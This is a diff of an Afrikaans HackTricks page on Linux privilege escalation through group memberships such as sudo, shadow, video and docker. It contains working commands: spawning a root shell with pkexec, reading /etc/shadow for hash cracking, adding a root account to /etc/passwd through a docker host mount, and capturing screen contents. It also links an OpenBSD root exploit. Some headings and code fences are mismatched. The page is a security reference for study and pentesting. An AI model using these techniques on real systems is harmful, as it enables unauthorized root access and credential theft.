@@ -8,8 +8,8 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
@@ -34,12 +34,11 @@ sudo su
 ```
 ### PE - Metode 2
 
-Vind alle suid-binêre en kontroleer of die binêre **Pkexec** daar is:
+Vind alle suid-binêre lêers en kontroleer of die binêre lêer **Pkexec** daar is:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Indien jy vind dat die binêre **pkexec 'n SUID-binêre** is en jy behoort aan **sudo** of **admin**, kan jy waarskynlik binêre lêers uitvoer as sudo deur `pkexec` te gebruik.\
-Dit is omdat hierdie groepe tipies binne die **polkit-beleid** is. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
+Indien jy vind dat die binêre **pkexec 'n SUID-binêre** is en jy behoort aan **sudo** of **admin**, kan jy waarskynlik binêres uitvoer as sudo deur `pkexec` te gebruik. Dit is omdat hierdie groepe tipies binne die **polkit-beleid** is. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -49,7 +48,7 @@ Om **root te word kan jy uitvoer**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
+Indien jy probeer om **pkexec** uit te voer en jy hierdie **fout** kry:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
@@ -65,31 +64,26 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 ## Interessante Groepe vir Linux Privilege Escalation
 
-In Linux, daar is verskeie interessante groepe wat 'n aanvaller kan help om privilegie-escalasie aanvalle uit te voer. Hier is 'n lys van 'n paar van hierdie groepe:
+In Linux, daar is verskeie interessante groepe wat 'n aanvaller kan help om privilege escalation aanvalle uit te voer. Hier is 'n lys van 'n paar van hierdie groepe:
 
-1. **`sudo` Groep:**
-   Die lede van hierdie groep kan dikwels `sudo` gebruik om spesifieke take uit te voer wat hulle normaalweg nie sou kon doen nie.
+1. **`docker` Groep**: As 'n gebruiker lid is van die `docker` groep, kan hulle Docker beheer sonder om `sudo` te gebruik.
+   
+2. **`lxd` Groep**: Soortgelyk aan die `docker` groep, kan lede van die `lxd` groep LXD beheer sonder `sudo`.
 
-2. **`docker` Groep:**
-   As 'n gebruiker lid is van die `docker` groep, kan hulle dikwels `docker` bevele hardloop sonder die behoefte aan `sudo`.
+3. **`sudo` Groep**: As 'n gebruiker lid is van die `sudo` groep, kan hulle `sudo` gebruik om beheerderstoegang te verkry.
 
-3. **`lxd` Groep:**
-   Soos die `docker` groep, kan lede van die `lxd` groep dikwels `lxd` bevele hardloop sonder `sudo`.
+4. **`wheel` Groep**: Op bepaalde Linux-stelsels kan lede van die `wheel` groep ook `sudo` gebruik vir beheerderstoegang.
 
-4. **`wheel` Groep:**
-   Die `wheel` groep is dikwels gekonfigureer om `sudo` toegang te hê, wat dit 'n interessante teiken vir aanvallers maak.
+5. **`root` Groep**: As 'n gebruiker lid is van die `root` groep, het hulle volle beheerderstoegang tot die stelsel.
 
-5. **`root` Groep:**
-   Alhoewel dit nie algemeen aanbeveel word nie, kan 'n aanvaller met toegang tot 'n rekening wat lid is van die `root` groep maklik beheer oor die stelsel verkry.
-
-Dit is belangrik om bewus te wees van hierdie groepe en om hulle regte behoorlik te bestuur om die risiko van privilegie-escalasie aanvalle te verminder.
-
-{% code %}
+Dit is belangrik vir stelseladministrateurs om te verseker dat slegs benodigde gebruikers toegang het tot hierdie groepe om die risiko van privilege escalation aanvalle te verminder.
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-## Wielgroep
+{% endcode %}
+
+## Wheel Groep
 
 **Soms**, **standaard** binne die **/etc/sudoers** lê hierdie lyn:
 ```
@@ -103,7 +97,7 @@ sudo su
 ```
 ## Skadugroep
 
-Gebruikers van die **groep skadu** kan die **/etc/shadow** lêer **lees**:
+Gebruikers van die **skadugroep** kan die **/etc/shadow** lêer **lees**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
@@ -113,7 +107,7 @@ So, lees die lêer en probeer om **sekere hasse te kraak**.
 
 **personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) by te voeg sonder om root-voorregte nodig te hê (let wel dat uitvoerbare lêers in `/usr/local/bin` in die PATH-veranderlike van enige gebruiker is, en hulle mag die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[bron\]](https://wiki.debian.org/SystemGroups)
 
-In debian-verspreidings, wys die `$PATH`-veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
+In Debian-verspreidings, wys die `$PATH`-veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -193,30 +187,30 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 Die **tty1** beteken dat die gebruiker **yossi fisies ingeteken** is by 'n terminal op die rekenaar.
 
-Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms waarneem. Om dit te doen, moet jy **die huidige beeld op die skerm vasvang** in rou data en die resolusie kry wat die skerm gebruik. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
+Die **video groep** het toegang om die skermuitset te sien. Jy kan basies die skerms waarneem. Om dit te doen, moet jy **die huidige beeld op die skerm vasvang** in rou data en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Om die **rofbeeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rofbeelddata**:
+Om die **rou beeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rou beeld data**:
 
-![](<../../../.gitbook/assets/image (287) (1).png>)
+![](<../../../.gitbook/assets/image (460).png>)
 
-Verander dan die Breedte en Hoogte na die wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):
+Verander dan die Wydte en Hoogte na die waardes wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):
 
-![](<../../../.gitbook/assets/image (288).png>)
+![](<../../../.gitbook/assets/image (314).png>)
 
-## Rooigroep
+## Root Groep
 
-Dit lyk asof **lede van die rooigroep** standaard toegang kan hê om **sekere dienskonfigurasie-lêers** of **sekere biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te eskaleer...
+Dit lyk asof standaard **lede van die root groep** toegang kan hê om **sekere dienskonfigurasie-lêers** of **sekere biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te eskaleer...
 
-**Kyk watter lêers rooigroeplede kan wysig**:
+**Kyk watter lêers root-lede kan wysig**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
 ## Docker Groep
 
-Jy kan die **wortel-lêerstelsel van die gasheer-rekenaar aan 'n instansie se volume koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief worteltoegang tot die rekenaar.
+Jy kan die **wortel-lêerstelsel van die gasheermasjien aan 'n instansie se volume koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief worteltoegang tot die masjien.
 ```bash
 docker image #Get images from the docker service
 
@@ -228,7 +222,12 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-## Linux-groep
+## lxc/lxd Groep
 
 Gewoonlik het **lede** van die groep **`adm`** toestemmings om **log** lêers binne _/var/log/_ te **lees**.\
 Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis na die **logs kyk**.
+
+## Auth groep
+
+Binne OpenBSD kan die **auth** groep gewoonlik skryfregte hê in die _**/etc/skey**_ en _**/var/db/yubikey**_ as hulle gebruik word.\
+Hierdie regte kan misbruik word met die volgende uitbuiting om **privileges te eskaleer** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
